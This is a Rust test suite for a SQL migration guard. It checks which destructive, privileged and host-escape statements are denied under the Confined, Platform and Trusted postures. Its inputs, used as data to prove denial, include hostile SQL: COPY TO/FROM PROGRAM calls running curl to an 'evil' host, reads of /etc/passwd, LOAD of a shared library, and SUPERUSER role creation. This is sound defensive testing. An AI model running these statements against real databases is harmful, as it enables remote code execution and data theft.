//! Guard behaviour-lock suite — lives here rather than in `zero-migrate-guard`'s
//! `guard/mod.rs`.
//!
//! These scenarios drive the SQL guard THROUGH the engine's IR-lower pipeline
//! (`render::lower::IrAuthor` / `conn::ExecutorConfig`), so they must live in the
//! engine crate (which depends on `zero-migrate-guard`), not in the leaf guard
//! crate (which deliberately cannot depend on the engine). They exercise the
//! guard's public API + engine internals together.
//!
//! Coverage map:
//!   - capability minting is named-seam-only by convention.
//!   - Platform widening is correct AND bounded (privileged constructs pass;
//!     RCE/host-escape/cross-schema-to-creator still denied).
//!   - DO-block privileged DDL applies under Platform; the RCE token-scan
//!     stays hard even under Platform; the same blocks deny under Confined.
//!   - the SchemaScope swap is byte-identical under Single for the
//!     func-def-target + literal-schema-ref read sites.

//! Included as an in-crate `#[cfg(test)] mod` from `lib.rs`, so `crate::…` paths
//! reach the engine's internals (`render::lower`, `conn::ExecutorConfig`) that an
//! external `tests/` crate could not.

// Many types below are named via full `crate::…` paths (matching the original
// in-module code); only the bare-referenced names are imported here.
use crate::guard::denylist::rule;
use crate::guard::{
    check_ir_data_security_policy, data_security_rule, flags_for, GuardConfig, GuardError, SqlGuard,
};
use crate::model::capability::OperatorCapability;
use crate::model::ir::{MigrationIr, Op};
use crate::model::policy::{DestructiveOps, SchemaScope};
use crate::{GuardMode, SqlDialect};

/// A Platform guard over the real port allowlist (`zero_migrate` / `public`) +
/// the two ported extensions. Minted via the `for_test` seam, which
/// `zero-migrate-ir` gates behind its `test-support` feature. This crate enables
/// that feature as a dev-dependency only, so the seam never reaches a production
/// build.
fn platform_guard() -> SqlGuard {
    SqlGuard::new(platform_guard_config())
}

fn platform_guard_config() -> GuardConfig {
    platform_guard_config_with_data(false, DestructiveOps::Allow)
}

fn platform_guard_config_with_data(
    require_rls: bool,
    destructive_ops: DestructiveOps,
) -> GuardConfig {
    GuardConfig::from_policy(
        crate::test_fixtures::operator_with_data_security(
            &["zero_migrate", "public"],
            &["citext", "uuid-ossp"],
            require_rls,
            destructive_ops,
        ),
        SqlDialect::Postgres,
    )
}

fn confined_guard_config() -> GuardConfig {
    GuardConfig::from_policy(
        crate::test_fixtures::no_inject("zero_migrate"),
        SqlDialect::Postgres,
    )
}

fn confined_guard() -> SqlGuard {
    SqlGuard::new(confined_guard_config())
}

fn vendor_ir(op: zero_migrate_ir::ir::Op) -> zero_migrate_ir::ir::MigrationIr {
    zero_migrate_ir::ir::MigrationIr {
        ir_version: zero_migrate_ir::ir::CURRENT_IR_VERSION,
        name: "vendor_guard_probe".into(),
        owner_app: "app_corpus".into(),
        ops: vec![op],
        flags: Default::default(),
        depends_on: Vec::new(),
        supersedes: Vec::new(),
        preconditions: Vec::new(),
        checksum: None,
    }
}

fn ir_with(ops: Vec<Op>) -> MigrationIr {
    MigrationIr {
        ir_version: zero_migrate_ir::ir::CURRENT_IR_VERSION,
        name: "data_security_probe".into(),
        owner_app: "app_corpus".into(),
        ops,
        flags: Default::default(),
        depends_on: Vec::new(),
        supersedes: Vec::new(),
        preconditions: Vec::new(),
        checksum: None,
    }
}

fn create_table(name: &str) -> Op {
    Op::CreateTable {
        name: name.to_string(),
        columns: Vec::new(),
        primary_key: None,
        constraints: Vec::new(),
        indexes: Vec::new(),

        partition_by: None,

        runtime_options: None,
        schema: None,
        existence_guard: None,
    }
}

#[test]
fn destructive_ops_forbid_denies_structured_destructive_sql_classes() {
    let confined = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
        SqlDialect::Postgres,
    ));
    for sql in [
        "DROP TABLE users",
        "ALTER TABLE users DROP COLUMN email",
        "ALTER TABLE users DROP CONSTRAINT users_email_key",
        "ALTER TABLE users ALTER COLUMN age TYPE smallint",
        "TRUNCATE users",
        "DELETE FROM users",
        "DROP MATERIALIZED VIEW users_mv",
        "DROP VIEW users_view",
    ] {
        assert!(
            matches!(
                confined.check(sql),
                Err(GuardError::DataSecurityPolicy {
                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                    ..
                })
            ),
            "expected destructive_ops=forbid to deny {sql}"
        );
    }

    let report = confined
        .check("DROP INDEX users_email_idx")
        .expect("plain DROP INDEX is reversible structure");
    assert!(
        !report.destructive,
        "plain DROP INDEX must not be classified as destructive SQL"
    );

    let platform = SqlGuard::new(platform_guard_config_with_data(
        false,
        DestructiveOps::Forbid,
    ));
    assert!(matches!(
        platform.check("DROP SCHEMA public"),
        Err(GuardError::DataSecurityPolicy {
            rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
            ..
        })
    ));
}

#[test]
fn destructive_ops_forbid_denies_dml_holes_and_unknowns_fail_closed() {
    let guard = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
        SqlDialect::Postgres,
    ));

    for sql in [
        "UPDATE users SET email = NULL",
        "DELETE FROM users",
        "DELETE FROM users WHERE 1=1",
        "WITH t AS (DELETE FROM users) SELECT 1",
        "WITH t AS (UPDATE users SET x=1) SELECT 1",
        "DELETE FROM users WHERE 't'",
        "DELETE FROM users WHERE true::bool",
        "DELETE FROM users WHERE 1<2",
        "UPDATE users SET email = NULL WHERE 1=1",
        "MERGE INTO users USING incoming ON users.id = incoming.id WHEN MATCHED THEN DELETE",
        "WITH t AS (MERGE INTO users USING incoming ON users.id = incoming.id WHEN MATCHED THEN DELETE) SELECT 1",
    ] {
        assert!(
            matches!(
                guard.check(sql),
                Err(GuardError::DataSecurityPolicy {
                    rule: data_security_rule::DESTRUCTIVE_OPS_FORBID,
                    ..
                })
            ),
            "expected destructive_ops=forbid to deny destructive DML hole {sql}"
        );
    }

    assert!(
        matches!(
            guard.check("DO $$ BEGIN NULL; END $$"),
            Err(GuardError::DataSecurityPolicy {
                rule: data_security_rule::UNCLASSIFIED_OP_DENIED_UNDER_FORBID,
                ..
            })
        ),
        "unclassified statements must be denied under destructive_ops=forbid"
    );
}

#[test]
fn destructive_ops_warn_allows_and_records_structured_warning() {
    let guard = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject_with_data_security("public", false, DestructiveOps::Warn),
        SqlDialect::Postgres,
    ));

    for sql in [
        "DELETE FROM users",
        "DROP MATERIALIZED VIEW users_mv",
        "DROP VIEW users_view",
        "ALTER TABLE users DROP CONSTRAINT users_email_key",
    ] {
        let report = guard.check(sql).expect("warn permits destructive SQL");

        assert!(
            report.advisories.iter().any(|a| {
                a.rule == crate::analysis::analyze::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
            }),
            "warn must record advisory for {sql}: {:?}",
            report.advisories
        );
    }

    let report = guard
        .check("DROP INDEX users_email_idx")
        .expect("warn permits non-destructive DROP INDEX SQL");
    assert!(
        !report.advisories.iter().any(|a| {
            a.rule == crate::analysis::analyze::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN
        }),
        "plain DROP INDEX must not record a destructive_ops warning: {:?}",
        report.advisories
    );
}

#[test]
fn destructive_ops_warn_allows_and_records_unknown_warning() {
    let guard = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject_with_data_security("public", false, DestructiveOps::Warn),
        SqlDialect::Postgres,
    ));

    let report = guard
        .check("DO $$ BEGIN NULL; END $$")
        .expect("warn permits unclassified SQL with an advisory");

    assert!(
        report.advisories.iter().any(|a| {
            a.rule == crate::analysis::analyze::rule::DATA_SECURITY_UNCLASSIFIED_OPS_WARN
        }),
        "warn must record advisory for unclassified SQL: {:?}",
        report.advisories
    );
}

#[test]
fn destructive_ops_allow_is_silent_for_policy_warning() {
    let guard = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject("public"),
        SqlDialect::Postgres,
    ));

    let report = guard
        .check("DROP TABLE users")
        .expect("allow permits the drop");

    assert!(!report
        .advisories
        .iter()
        .any(|a| { a.rule == crate::analysis::analyze::rule::DATA_SECURITY_DESTRUCTIVE_OPS_WARN }));
}

#[test]
fn destructive_ops_forbid_allows_clearly_non_destructive_sql() {
    let guard = SqlGuard::new(GuardConfig::from_policy(
        crate::test_fixtures::no_inject_with_data_security("public", false, DestructiveOps::Forbid),
        SqlDialect::Postgres,
    ));

    guard
        .check("CREATE TABLE users(id bigint primary key)")
        .expect("CREATE TABLE is not destructive");
    guard
        .check("ALTER TABLE users ADD COLUMN email text")
        .expect("ADD COLUMN is not destructive");
    guard
        .check("CREATE INDEX users_email_idx ON users(email)")
        .expect("CREATE INDEX is not destructive");
    guard
        .check("INSERT INTO users(id) VALUES (1)")
        .expect("INSERT is not destructive");
    guard
        .check("SELECT * FROM users")
        .expect("SELECT is not destructive");
    guard
        .check("INSERT INTO users SELECT * FROM incoming")
        .expect("INSERT SELECT without a DML CTE is not destructive");
    guard
        .check("ALTER TABLE users ADD CONSTRAINT users_email_chk CHECK (email IS NOT NULL)")
        .expect("ADD CONSTRAINT is not destructive");
    guard
        .check("COMMENT ON TABLE users IS 'creator table'")
        .expect("COMMENT is not destructive");

    let platform = SqlGuard::new(platform_guard_config_with_data(
        false,
        DestructiveOps::Forbid,
    ));
    platform
        .check("CREATE SCHEMA IF NOT EXISTS public")
        .expect("CREATE SCHEMA is not destructive");
    platform
        .check("ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY")
        .expect("ENABLE RLS is not destructive");
}

#[test]
fn require_rls_rejects_create_table_without_same_migration_enable() {
    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
    let ir = ir_with(vec![create_table("users")]);

    let err = check_ir_data_security_policy(&cfg, &ir).unwrap_err();

    assert_eq!(err.op_index, 0);
    assert!(matches!(
        err.source,
        GuardError::DataSecurityPolicy {
            rule: data_security_rule::REQUIRE_RLS,
            ..
        }
    ));
}

#[test]
fn require_rls_accepts_create_table_with_same_migration_enable() {
    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
    let ir = ir_with(vec![
        create_table("users"),
        Op::SetRls {
            table: "users".to_string(),
            schema: None,
            enabled: Some(true),
            forced: None,
        },
    ]);

    check_ir_data_security_policy(&cfg, &ir).expect("matching setRls satisfies require_rls");
}

#[test]
fn require_rls_rejects_create_enable_disable_net_off() {
    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
    let ir = ir_with(vec![
        create_table("users"),
        Op::SetRls {
            table: "users".to_string(),
            schema: None,
            enabled: Some(true),
            forced: None,
        },
        Op::SetRls {
            table: "users".to_string(),
            schema: None,
            enabled: Some(false),
            forced: None,
        },
    ]);

    let err = check_ir_data_security_policy(&cfg, &ir).unwrap_err();

    assert_eq!(err.op_index, 2);
    assert!(matches!(
        err.source,
        GuardError::DataSecurityPolicy {
            rule: data_security_rule::REQUIRE_RLS,
            ..
        }
    ));
}

#[test]
fn require_rls_rejects_standalone_disable_and_no_force() {
    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);

    for op in [
        Op::SetRls {
            table: "users".to_string(),
            schema: None,
            enabled: Some(false),
            forced: None,
        },
        Op::SetRls {
            table: "users".to_string(),
            schema: None,
            enabled: None,
            forced: Some(false),
        },
    ] {
        let err = check_ir_data_security_policy(&cfg, &ir_with(vec![op])).unwrap_err();
        assert_eq!(err.op_index, 0);
        assert!(matches!(
            err.source,
            GuardError::DataSecurityPolicy {
                rule: data_security_rule::REQUIRE_RLS,
                ..
            }
        ));
    }
}

#[test]
fn require_rls_rejects_pg_raw_table_creation_island_fail_closed() {
    let cfg = platform_guard_config_with_data(true, DestructiveOps::Allow);
    let author = platform_author(&cfg);
    let op = Op::PgRaw {
        sql: "CREATE TABLE zero_migrate.raw_users AS SELECT 1 AS id".into(),
        reason: "require_rls raw table creation regression".into(),
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "pgRaw");
            assert!(matches!(
                denial.source,
                GuardError::DataSecurityPolicy {
                    rule: data_security_rule::REQUIRE_RLS,
                    ..
                }
            ));
        }
        other => panic!("require_rls must reject raw table-creation islands; got {other:?}"),
    }
}

fn platform_author(guard_cfg: &GuardConfig) -> crate::render::lower::IrAuthor {
    let scope = guard_cfg
        .schema_scope()
        .expect("Platform guard carries an allowlist scope");
    crate::render::lower::IrAuthor::new(
        "zero_migrate",
        "app_corpus",
        SqlDialect::Postgres,
        &crate::test_fixtures::no_inject("app"),
    )
    .with_schema_scope(scope)
}

fn is_denied(g: &SqlGuard, sql: &str) -> bool {
    matches!(
        g.check(sql),
        Err(GuardError::Denied { .. }
            | GuardError::CrossSchema { .. }
            | GuardError::DataSecurityPolicy { .. })
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum GuardDecision {
    Allow,
    Denied(&'static str),
    CrossSchema,
    Parse,
    RawRejected,
}

fn decision_of(g: &SqlGuard, sql: &str) -> GuardDecision {
    match g.check(sql) {
        Ok(_) => GuardDecision::Allow,
        Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::NamespacePolicy { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
        Err(GuardError::Parse(_)) => GuardDecision::Parse,
        Err(GuardError::SqliteRawSqlRejected | GuardError::MysqlRawSqlRejected) => {
            GuardDecision::RawRejected
        }
    }
}

fn raw_body_backstop_decision(cfg: &GuardConfig, body: &str) -> GuardDecision {
    let guard = SqlGuard::new(cfg.clone());
    let raw = "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $$...$$";
    match guard.check_raw_island_body_backstop(body, raw) {
        Ok(()) => GuardDecision::Allow,
        Err(GuardError::Denied { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::DataSecurityPolicy { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::NamespacePolicy { rule, .. }) => GuardDecision::Denied(rule),
        Err(GuardError::CrossSchema { .. }) => GuardDecision::CrossSchema,
        Err(GuardError::Parse(_)) => GuardDecision::Parse,
        Err(GuardError::SqliteRawSqlRejected | GuardError::MysqlRawSqlRejected) => {
            GuardDecision::RawRejected
        }
    }
}

fn assert_profile_decisions(
    site: &str,
    sql: &str,
    confined: GuardDecision,
    platform: GuardDecision,
    trusted: GuardDecision,
) {
    let profiles = [
        ("confined", confined_guard(), confined),
        ("platform", platform_guard(), platform),
        ("trusted", trusted_guard(), trusted),
    ];
    for (profile, guard, expected) in profiles {
        let got = decision_of(&guard, sql);
        assert_eq!(
            got, expected,
            "{site} behavior lock changed for {profile}: {sql}"
        );
    }
}

#[test]
fn m2_stage2_site_459_belt_skip_behavior_lock() {
    assert_profile_decisions(
        "site :459 belt-skip",
        "COPY zero_migrate.t TO PROGRAM 'sh -c id'",
        GuardDecision::Denied(rule::COPY_PROGRAM),
        GuardDecision::Denied(rule::COPY_PROGRAM),
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_655_create_role_behavior_lock() {
    assert_profile_decisions(
        "site :655 create role",
        "CREATE ROLE zero_migrate_auth NOLOGIN",
        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_664_alter_role_behavior_lock() {
    assert_profile_decisions(
        "site :664 alter role",
        "ALTER ROLE zero_migrate_auth LOGIN",
        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_670_role_set_and_drop_behavior_lock() {
    for sql in [
        "ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public",
        "DROP ROLE IF EXISTS zero_migrate_app",
    ] {
        assert_profile_decisions(
            "site :670 alter role set / drop role",
            sql,
            GuardDecision::Denied(rule::ROLE_MANAGEMENT),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }
}

#[test]
fn m2_stage2_site_682_grant_stmt_behavior_lock() {
    assert_profile_decisions(
        "site :682 grant stmt",
        "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_app",
        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_691_grant_role_stmt_behavior_lock() {
    assert_profile_decisions(
        "site :691 grant role stmt",
        "GRANT zero_migrate_app TO zero_migrate_worker",
        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_700_alter_default_privileges_behavior_lock() {
    assert_profile_decisions(
        "site :700 alter default privileges",
        "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
        GuardDecision::Denied(rule::PRIVILEGE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_798_drop_stmt_behavior_lock() {
    for sql in [
        "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
        "DROP SCHEMA IF EXISTS public CASCADE",
        "DROP EXTENSION IF EXISTS citext",
    ] {
        assert_profile_decisions(
            "site :798 platform drop object set",
            sql,
            GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
            GuardDecision::Allow,
            GuardDecision::Allow,
        );
    }
}

#[test]
fn m2_stage2_site_821_create_schema_behavior_lock() {
    assert_profile_decisions(
        "site :821 create schema",
        "CREATE SCHEMA IF NOT EXISTS public",
        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_829_create_policy_behavior_lock() {
    assert_profile_decisions(
        "site :829 create policy",
        "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets USING (true)",
        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_836_drop_owned_behavior_lock() {
    assert_profile_decisions(
        "site :836 drop owned",
        "DROP OWNED BY zero_migrate_auth",
        GuardDecision::Denied(rule::UNRECOGNIZED_DANGEROUS),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_900_rls_alter_table_behavior_lock() {
    assert_profile_decisions(
        "site :900 RLS alter table",
        "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
        GuardDecision::Denied(rule::UNSAFE_ALTER_TABLE_CMD),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_1209_body_role_needles_behavior_lock() {
    assert_profile_decisions(
        "site :1209 body role needles",
        "DO $$ BEGIN PERFORM 'create role hidden'; END $$",
        GuardDecision::Denied(rule::ROLE_MANAGEMENT),
        GuardDecision::Allow,
        GuardDecision::Allow,
    );
}

#[test]
fn m2_stage2_site_1209_raw_island_body_backstop_behavior_lock() {
    let body = "BEGIN PERFORM 'not sql create role hidden'; PERFORM 'touch search_path'; END;";
    assert_eq!(
        raw_body_backstop_decision(&confined_guard_config(), body),
        GuardDecision::Denied(rule::BODY_INSPECTION),
        "Confined raw-island body backstop must deny role/search_path needles"
    );
    assert_eq!(
        raw_body_backstop_decision(&platform_guard_config(), body),
        GuardDecision::Allow,
        "Platform is the only posture whose body-token backstop relaxes role/search_path needles"
    );
    assert_eq!(
        raw_body_backstop_decision(&trusted_guard_config(), body),
        GuardDecision::Denied(rule::BODY_INSPECTION),
        "Trusted raw-island body backstop must match the pre-refactor non-Platform decision"
    );

    let cfg = trusted_guard_config();
    let author = trusted_author();
    let op = zero_migrate_ir::ir::Op::CreateFunction {
        name: "raw_body_role_needles".into(),
        schema: Some("public".into()),
        args: None,
        returns: "void".into(),
        language: zero_migrate_ir::ir::FuncLanguage::Plpgsql,
        replace: Some(true),
        volatility: None,
        body: body.into(),
    };

    match author.lower_guarded(
        &vendor_ir(op),
        &cfg,
        &crate::render::lower::LiveSchema::default(),
    ) {
        Err(crate::render::lower::IrGuardedLowerError::Denied(denial)) => {
            assert_eq!(denial.op_kind, "createFunction");
            assert!(
                matches!(
                    denial.source,
                    GuardError::Denied {
                        rule: rule::BODY_INSPECTION,
                        ..
                    }
                ),
                "Trusted createFunction must route through the raw-island body backstop, got {:?}",
                denial.source
            );
        }
        other => panic!(
            "Trusted createFunction role/search_path body must be denied through lower_guarded; got {other:?}"
        ),
    }
}

#[test]
fn m2_stage2_superuser_belt_sites_stay_hard_denied() {
    for (site, sql, expected_rule) in [
        (
            "site :651 create role SUPERUSER",
            r#"CREATE ROLE "evil" SUPERUSER"#,
            rule::SUPERUSER_ROLE,
        ),
        (
            "site :661 alter role SUPERUSER",
            r#"ALTER ROLE "evil" SUPERUSER"#,
            rule::SUPERUSER_ROLE,
        ),
        (
            "site :1201 body SUPERUSER token scan",
            r#"DO $$ BEGIN EXECUTE format('ALTER ROLE %I SUPERUSER', 'evil'); END $$"#,
            rule::BODY_INSPECTION,
        ),
    ] {
        for (profile, guard) in [
            ("confined", confined_guard()),
            ("platform", platform_guard()),
        ] {
            let got = decision_of(&guard, sql);
            assert_eq!(
                got,
                GuardDecision::Denied(expected_rule),
                "{site} must stay hard-denied under {profile}: {sql}"
            );
        }
    }
}

// ---- T11: capability minting uses named seams --------------------------

/// What this pins is the CONFIG the policy produces, not exclusive minting - the
/// name is historical. `OperatorCapability` is freely mintable by any dependent
/// crate (`new`, `Default`, and `for_test` under an additive feature), and it
/// authorises nothing; `ExecutorConfig::platform` ignores the token and returns what
/// the public `ExecutorConfig::new` returns. The assertions below are about the
/// composed `EffectivePolicy`, which is the part that cannot be forged.
#[test]
fn t11_platform_capability_mints_only_via_runner_seam() {
    let cap = OperatorCapability::for_test();
    // The token grants a Platform GuardConfig + ExecutorConfig. The Platform posture
    // is now identified by its PDP shape: a schema allowlist scope + the full belt
    // (it does NOT skip the static guard — only Trusted does).
    let gcfg = GuardConfig::from_policy(
        crate::test_fixtures::operator_no_inject("zero_migrate"),
        SqlDialect::Postgres,
    );
    assert_eq!(
        gcfg.schema_scope(),
        Some(SchemaScope::Allowlist(vec!["zero_migrate".into()]))
    );
    assert!(
        !gcfg.skips_denylist_belt(),
        "Platform runs the full static belt"
    );
    let ecfg = crate::conn::ExecutorConfig::platform(
        &cap,
        "platform",
        "zero_migrate",
        crate::test_fixtures::operator_no_inject("zero_migrate"),
    );
    assert_eq!(
        ecfg.guard_config().schema_scope(),
        Some(SchemaScope::Allowlist(vec!["zero_migrate".into()]))
    );
    assert!(!ecfg.guard_config().skips_denylist_belt());
    // NOTE: `OperatorCapability::new` is PUBLIC, as are `Default` and (under an
    // additive feature) `for_test`, so any dependent crate can mint one. Nothing
    // reads it. The boundary that is actually pinned is the unforgeable
    // `EffectivePolicy`, held by the T8 `compile_fail` doctests in
    // `zero_migrate_guard::guard` - there is no `tests/trybuild_*` and never was.
}

// ---- Platform widening is correct AND bounded ----------------------

#[test]
fn t4_platform_allows_privileged_constructs() {
    let g = platform_guard();
    let allowed = [
        // role mgmt
        "CREATE ROLE zero_migrate_auth NOLOGIN",
        "ALTER ROLE zero_migrate_auth SET search_path = zero_migrate, public",
        "ALTER ROLE zero_migrate_auth RESET search_path",
        "DROP ROLE IF EXISTS zero_migrate_auth",
        // grant / privilege mgmt
        "GRANT CONNECT ON DATABASE zero_migrate TO zero_migrate_auth",
        "GRANT USAGE ON SCHEMA public TO zero_migrate_auth",
        "REVOKE USAGE ON SCHEMA public FROM zero_migrate_auth",
        "ALTER DEFAULT PRIVILEGES IN SCHEMA zero_migrate GRANT SELECT ON TABLES TO zero_migrate_app",
        // schema
        "CREATE SCHEMA IF NOT EXISTS zero_migrate AUTHORIZATION zero_migrate_auth",
        "DROP SCHEMA IF EXISTS zero_migrate CASCADE",
        // RLS — the four toggles
        "ALTER TABLE zero_migrate.app_secrets ENABLE ROW LEVEL SECURITY",
        "ALTER TABLE zero_migrate.app_secrets FORCE ROW LEVEL SECURITY",
        "ALTER TABLE zero_migrate.app_secrets NO FORCE ROW LEVEL SECURITY",
        "ALTER TABLE zero_migrate.app_secrets DISABLE ROW LEVEL SECURITY",
        // policy
        "CREATE POLICY tenant_isolation ON zero_migrate.app_secrets \
         USING (app_id = current_setting('zero_migrate.tenant_app', true)::uuid)",
        "DROP POLICY IF EXISTS tenant_isolation ON zero_migrate.app_secrets",
        // extensions (allowlisted under Platform)
        "CREATE EXTENSION citext",
        "CREATE EXTENSION IF NOT EXISTS \"uuid-ossp\" WITH SCHEMA public",
        "DROP EXTENSION IF EXISTS \"uuid-ossp\"",
        // DROP OWNED BY (0025 rollback)
        "DROP OWNED BY zero_migrate_auth",
        // cross-schema references within the allowlist
        "CREATE TABLE public.clients(id int primary key)",
        "INSERT INTO public.t SELECT * FROM zero_migrate.app_secrets",
    ];
    for sql in allowed {
        assert!(
            g.check(sql).is_ok(),
            "Platform should ALLOW but DENIED: {sql}\n  got: {:?}",
            g.check(sql)
        );
    }
}

#[test]
fn t4_platform_still_denies_rce_and_host_escape() {
    let g = platform_guard();
    let denied = [
        // RCE / host escape — kept hard in BOTH profiles
        "COPY zero_migrate.t TO PROGRAM 'sh -c \"curl evil\"'",
        "COPY zero_migrate.t FROM '/etc/passwd'",
        "SELECT pg_read_file('/etc/passwd')",
        "CREATE EXTENSION dblink",
        "CREATE EXTENSION postgres_fdw",
        "CREATE FUNCTION zero_migrate.f() RETURNS void AS 'x' LANGUAGE plpythonu",
        "ALTER SYSTEM SET wal_level = minimal",
        "CREATE FUNCTION zero_migrate.g() RETURNS int LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$",
        "LOAD 'evil.so'",
        // cross-schema to a NON-allowlisted (creator) schema
        "CREATE TABLE proj_acme.steal(id int)",
        "INSERT INTO proj_acme.t SELECT * FROM zero_migrate.app_secrets",
    ];
    for sql in denied {
        assert!(
            is_denied(&g, sql),
            "Platform should STILL DENY but it passed: {sql}\n  got: {:?}",
            g.check(sql)
        );
    }
}

// ---- DO-block privileged DDL under Platform (body widening) -----

/// 0025's bootstrap shape: a DO block whose EXECUTE literals CREATE ROLE /
/// ALTER ROLE … SET search_path / GRANT. ALLOWED under Platform (both the
/// recursion arm and the relaxed token-scan), DENIED under Confined.
const BOOTSTRAP_DO: &str = "DO $bootstrap$
    BEGIN
        EXECUTE 'CREATE ROLE zero_migrate_app NOLOGIN';
        EXECUTE 'ALTER ROLE zero_migrate_app SET search_path = zero_migrate, public';
        EXECUTE 'GRANT USAGE ON SCHEMA zero_migrate TO zero_migrate_app';
    END
    $bootstrap$;";

/// A platform role bootstrap shape: a DO block with a bare (parsed) CREATE ROLE inside.
const PLATFORM_ROLE_DO: &str = "DO $$
    BEGIN
        IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'zero_migrate_gateway') THEN
            CREATE ROLE zero_migrate_gateway NOLOGIN;
        END IF;
    END
    $$;";

#[test]
fn t4b_do_block_privileged_ddl_applies_under_platform() {
    let g = platform_guard();
    assert!(
        g.check(BOOTSTRAP_DO).is_ok(),
        "0025 bootstrap DO should pass under Platform: {:?}",
        g.check(BOOTSTRAP_DO)
    );
    assert!(
        g.check(PLATFORM_ROLE_DO).is_ok(),
        "platform role DO should pass under Platform: {:?}",
        g.check(PLATFORM_ROLE_DO)
    );
}

#[test]
fn t4b_neg_do_block_privileged_ddl_denied_under_confined() {
    let g = confined_guard();
    assert!(
        is_denied(&g, BOOTSTRAP_DO),
        "0025 bootstrap DO must DENY under Confined"
    );
    assert!(
        is_denied(&g, PLATFORM_ROLE_DO),
        "platform role DO must DENY under Confined"
    );
}

#[test]
fn t4b_neg_do_block_rce_denied_even_under_platform() {
    let g = platform_guard();
    let rce_do = "DO $$ BEGIN
        EXECUTE 'COPY zero_migrate.t FROM PROGRAM ''curl http://evil''';
    END $$;";
    assert!(
        is_denied(&g, rce_do),
        "COPY…PROGRAM in a body MUST deny even under Platform"
    );
}

// ---- SUPERUSER is host-reaching, denied even under Platform. A prior bug: the
// CreateRoleStmt arm returned Ok(()) unconditionally under Platform, so `CREATE
// ROLE x SUPERUSER` PASSED — a render-here-refuse-at-guard backstop that did not
// actually refuse. ----------------------------------------------------------

#[test]
fn superuser_role_denied_even_under_platform() {
    let g = platform_guard();
    // A plain role create is fine under Platform (the platform mints roles).
    assert!(
        g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#).is_ok(),
        "a non-superuser CREATE ROLE must still pass under Platform: {:?}",
        g.check(r#"CREATE ROLE "zero_migrate_auth" LOGIN"#)
    );
    // But SUPERUSER reaches the host — denied even under Platform, with the
    // dedicated rule id (NOT the generic role_management, which Platform
    // relaxes).
    for sql in [
        r#"CREATE ROLE "evil" SUPERUSER"#,
        r#"CREATE ROLE "evil" LOGIN SUPERUSER BYPASSRLS"#,
        r#"ALTER ROLE "zero_migrate_auth" SUPERUSER"#,
    ] {
        match g.check(sql) {
            Err(GuardError::Denied { rule: r, .. }) => assert_eq!(
                r,
                rule::SUPERUSER_ROLE,
                "SUPERUSER must deny with the superuser_role rule, got rule={r} for {sql}"
            ),
            other => {
                panic!("SUPERUSER must be DENIED even under Platform; got {other:?} for {sql}")
            }
        }
    }
    // NOSUPERUSER (the negative attribute) is not an escalation — it passes.
    assert!(
        g.check(r#"CREATE ROLE "zero_migrate_auth" NOSUPERUSER LOGIN"#)
            .is_ok(),
        "NOSUPERUSER must not trip the superuser deny"
    );
}

#[test]
fn superuser_role_in_if_not_exists_do_wrap_denied_even_under_platform() {
    let g = platform_guard();
    let sql = r#"DO $$ BEGIN
